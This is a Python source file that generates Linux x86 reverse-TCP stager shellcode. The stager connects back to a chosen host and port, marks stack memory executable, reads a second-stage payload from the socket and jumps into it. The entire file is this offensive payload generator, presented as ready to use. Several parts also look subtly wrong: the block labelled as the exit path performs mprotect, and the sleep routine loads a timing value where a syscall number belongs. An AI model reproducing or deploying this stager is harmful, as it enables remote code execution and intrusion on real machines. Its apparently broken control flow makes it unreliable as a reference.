import dataclasses
import socket
import struct
from typing import Any


@dataclasses.dataclass(slots=True)
class JumpPatchOffsets:
    """Relative jump displacement patch locations for the custom bytecode."""

    jns_mprotect: int = 0
    jz_failed: int = 0
    js_failed_mp: int = 0
    js_failed_recv: int = 0

    def clear(self):
        """Reset all offsets."""
        for field in dataclasses.fields(self):
            setattr(self, field.name, 0)


@dataclasses.dataclass(slots=True)
class CodeBlockOffsets:
    """Code block entry offsets for branching logic."""

    create_socket: int = 0
    failed: int = 0
    mprotect: int = 0

    def clear(self):
        """Reset all offsets."""
        for field in dataclasses.fields(self):
            setattr(self, field.name, 0)


class ReverseTcpX86:
    """Mixin that provides Linux x86 reverse-TCP stager generation."""

    jump_patch_offsets: Any = JumpPatchOffsets()
    code_block_offsets: Any = CodeBlockOffsets()
    buf: bytearray = bytearray()

    def _clear_state(self):
        """Reset all generation state to fresh instance-level values."""
        self.buf = bytearray()
        self.jump_patch_offsets = JumpPatchOffsets()
        self.code_block_offsets = CodeBlockOffsets()

    def _encode_port(self, port):
        """Encode port + AF_INET as a 4-byte little-endian push immediate."""
        packed = struct.pack("<H", port) + struct.pack(">H", 2)
        val = struct.unpack(">I", packed)[0]
        return struct.pack("<I", val)

    def _encode_host(self, host):
        """Encode an IPv4 host as 4 bytes."""
        return socket.inet_aton(host)

    def emit(self, *chunks):
        """Append instruction bytes to the shellcode buffer."""
        for chunk in chunks:
            self.buf.extend(chunk)

    def generate_reverse_tcp(self, host, retry_count=5, sleep_seconds=5.0, exitfunc="process"):
        """Assemble the Linux x86 reverse-TCP stager using the specific bytecode result."""

        # Prepare arguments
        sleep_ns = int((sleep_seconds % 1) * 1_000_000_000)
        encoded_port = self._encode_port(host[1])
        encoded_host = self._encode_host(host[0])

        # Make sure everything is cleared before building starts.
        self._clear_state()

        # push retry_count; pop esi
        self.emit(b"\x6a" + bytes([retry_count & 0xFF]) + b"\x5e")

        # create_socket block
        self.code_block_offsets.create_socket = len(self.buf)
        self.emit(
            b"\x31\xdb",  # xor ebx, ebx
            b"\xf7\xe3",  # mul ebx
            b"\x53",  # push ebx
            b"\x43",  # inc ebx
            b"\x53",  # push ebx
            b"\x6a\x02",  # push 2
            b"\xb0\x66",  # mov al, 0x66
            b"\x89\xe1",  # mov ecx, esp
            b"\xcd\x80",  # int 0x80
            b"\x97",  # xchg eax, edi
        )

        # set address
        self.emit(
            b"\x5b",  # pop ebx
            b"\x68" + encoded_host,  # push LHOST
            b"\x68" + encoded_port,  # push LPORT
            b"\x89\xe1",  # mov ecx, esp
        )

        # try_connect
        self.emit(
            b"\x6a\x66",  # push 0x66
            b"\x58",  # pop eax
            b"\xbb\x03\x00\x00\x00",  # mov ebx, 3
            b"\xcd\x80",  # int 0x80
            b"\x85\xc0",  # test eax, eax
        )

        self.jump_patch_offsets.jns_mprotect = len(self.buf)
        self.emit(b"\x79\x00")  # jns to mprotect

        # failure loop / nanosleep
        self.emit(b"\x4e")  # dec esi
        self.jump_patch_offsets.jz_failed = len(self.buf)
        self.emit(b"\x74\x00")  # jz to exit

        self.emit(
            b"\x6a\x00",  # push 0
            b"\x6a\x05",  # push 5
            b"\x89\xe3",  # mov ebx, esp
            b"\x31\xc9",  # xor ecx, ecx
            b"\x68" + struct.pack("<I", sleep_ns),  # push sleep_ns
            b"\x58",  # pop eax
            b"\xcd\x80",  # int 0x80
            b"\x83\xc4\x08",  # add esp, 8
        )

        # jmp back to create_socket (short)
        disp_create = self.code_block_offsets.create_socket - (len(self.buf) + 2)
        self.emit(b"\xeb" + bytes([disp_create & 0xFF]))

        # failed / exit block
        self.code_block_offsets.failed = len(self.buf)
        self.emit(
            b"\x89\xe3",  # mov ebx, esp
            b"\x81\xe3\x00\xf0\xff\xff",  # and ebx, 0xfffff000
            b"\xb9\x00\x10\x00\x00",  # mov ecx, 0x1000
            b"\xba\x07\x00\x00\x00",  # mov edx, 7
            b"\x6a\x7d",  # push 0x7d
            b"\x58",  # pop eax
            b"\xcd\x80",  # int 0x80
        )

        # mprotect success check
        self.code_block_offsets.mprotect = len(self.buf)
        self.emit(b"\x85\xc0")
        self.jump_patch_offsets.js_failed_mp = len(self.buf)
        self.emit(b"\x78\x00")  # js to failed

        # recv / read stage
        self.emit(
            b"\x89\xe1",  # mov ecx, esp
            b"\xba\x00\x10\x00\x00",  # mov edx, 0x1000
            b"\x89\xfb",  # mov ebx, edi
            b"\x6a\x03",  # push 3
            b"\x58",  # pop eax
            b"\xcd\x80",  # int 0x80
            b"\x85\xc0",  # test eax, eax
        )

        self.jump_patch_offsets.js_failed_recv = len(self.buf)
        self.emit(b"\x78\x00")  # js to failed

        # jump into stage
        self.emit(b"\xff\xe4")  # jmp esp

        # Final exit stub handling
        ef = str(exitfunc).lower().strip()
        if ef != "none":
            self.emit(
                b"\x6a\x01",  # push 1
                b"\x58",  # pop eax
                b"\x31\xdb",  # xor ebx, ebx
                b"\x43",  # inc ebx
                b"\xcd\x80",  # int 0x80
            )

        # Back-patch relative jumps
        def _patch(off, target):
            disp = target - (off + 2)
            self.buf[off + 1] = disp & 0xFF

        _patch(self.jump_patch_offsets.jns_mprotect, self.code_block_offsets.mprotect)
        _patch(self.jump_patch_offsets.jz_failed, self.code_block_offsets.failed)
        _patch(self.jump_patch_offsets.js_failed_mp, self.code_block_offsets.failed)
        _patch(self.jump_patch_offsets.js_failed_recv, self.code_block_offsets.failed)

        return bytes(self.buf)
